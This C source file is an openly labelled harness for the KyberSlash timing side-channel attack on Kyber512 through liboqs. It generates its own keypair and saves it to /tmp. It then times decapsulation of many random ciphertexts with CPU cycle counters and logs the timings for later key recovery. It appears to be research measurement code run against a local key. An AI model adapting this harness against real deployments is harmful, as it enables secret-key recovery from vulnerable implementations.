/* KyberSlash attack harness — random ciphertext mode
 *
 * Generates N random ciphertexts (uniform random bytes — most will fail
 * decryption integrity check, which is exactly what KyberSlash exploits:
 * the implicit-rejection branch still goes through the vulnerable
 * poly_compress / poly_tomsg division).
 *
 * Output: idx,cycles,ct_hex (full ciphertext hex-encoded for later analysis)
 */

#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <unistd.h>
#include <sys/syscall.h>
#include <sys/ioctl.h>
#include <linux/perf_event.h>
#include <oqs/oqs.h>

static int perf_fd = -1;

static int open_cpu_cycles_counter(void) {
    struct perf_event_attr pe;
    memset(&pe, 0, sizeof(pe));
    pe.type = PERF_TYPE_HARDWARE;
    pe.size = sizeof(pe);
    pe.config = PERF_COUNT_HW_CPU_CYCLES;
    pe.disabled = 0;
    pe.exclude_kernel = 1;
    pe.exclude_hv = 1;
    int fd = syscall(__NR_perf_event_open, &pe, 0, -1, -1, 0);
    if (fd < 0) { perror("perf_event_open"); return -1; }
    ioctl(fd, PERF_EVENT_IOC_RESET, 0);
    ioctl(fd, PERF_EVENT_IOC_ENABLE, 0);
    return fd;
}

static inline uint64_t read_cycles(void) {
    uint64_t c;
    if (read(perf_fd, &c, sizeof(c)) != sizeof(c)) return 0;
    return c;
}

static volatile uint8_t sink;

static void hex_encode(const uint8_t *src, size_t n, char *dst) {
    static const char H[] = "0123456789abcdef";
    for (size_t i = 0; i < n; i++) {
        dst[2*i]   = H[src[i] >> 4];
        dst[2*i+1] = H[src[i] & 0xF];
    }
    dst[2*n] = 0;
}

int main(int argc, char *argv[]) {
    if (argc != 2) { fprintf(stderr, "Usage: %s <n_decaps>\n", argv[0]); return 1; }
    long n = atol(argv[1]);

    perf_fd = open_cpu_cycles_counter();
    if (perf_fd < 0) return 1;

    OQS_KEM *kem = OQS_KEM_new(OQS_KEM_alg_kyber_512);
    if (!kem) { fprintf(stderr, "Kyber512 not available\n"); return 1; }

    uint8_t *pk = malloc(kem->length_public_key);
    uint8_t *sk = malloc(kem->length_secret_key);
    uint8_t *ct = malloc(kem->length_ciphertext);
    uint8_t *ss = malloc(kem->length_shared_secret);
    char    *ct_hex = malloc(2 * kem->length_ciphertext + 1);

    OQS_KEM_keypair(kem, pk, sk);

    /* Save the secret key to a file for later verification */
    FILE *f = fopen("/tmp/secret_key.bin", "wb");
    if (f) { fwrite(sk, 1, kem->length_secret_key, f); fclose(f); }
    f = fopen("/tmp/public_key.bin", "wb");
    if (f) { fwrite(pk, 1, kem->length_public_key, f); fclose(f); }

    fprintf(stderr, "Kyber512: pk=%zu sk=%zu ct=%zu ss=%zu\n",
            kem->length_public_key, kem->length_secret_key,
            kem->length_ciphertext, kem->length_shared_secret);
    fprintf(stderr, "Keys saved to /tmp/{secret,public}_key.bin\n");

    /* Warmup with a valid ciphertext */
    uint8_t *ct_warm = malloc(kem->length_ciphertext);
    uint8_t *ss_warm = malloc(kem->length_shared_secret);
    OQS_KEM_encaps(kem, ct_warm, ss_warm, pk);
    for (int i = 0; i < 2000; i++) {
        OQS_KEM_decaps(kem, ss, ct_warm, sk);
        sink ^= ss[0];
    }
    free(ct_warm); free(ss_warm);

    fprintf(stderr, "Starting capture (n=%ld)\n", n);
    printf("idx,cycles,ct_hex\n");

    for (long i = 0; i < n; i++) {
        OQS_randombytes(ct, kem->length_ciphertext);
        hex_encode(ct, kem->length_ciphertext, ct_hex);

        uint64_t t0 = read_cycles();
        OQS_KEM_decaps(kem, ss, ct, sk);
        uint64_t t1 = read_cycles();
        sink ^= ss[0];

        printf("%ld,%lu,%s\n", i, (unsigned long)(t1 - t0), ct_hex);

        if ((i+1) % 100000 == 0) {
            fprintf(stderr, "  %ld / %ld\n", i+1, n);
        }
    }

    fprintf(stderr, "Done. Sink: %u\n", sink);
    close(perf_fd);
    OQS_KEM_free(kem);
    free(pk); free(sk); free(ct); free(ss); free(ct_hex);
    return 0;
}
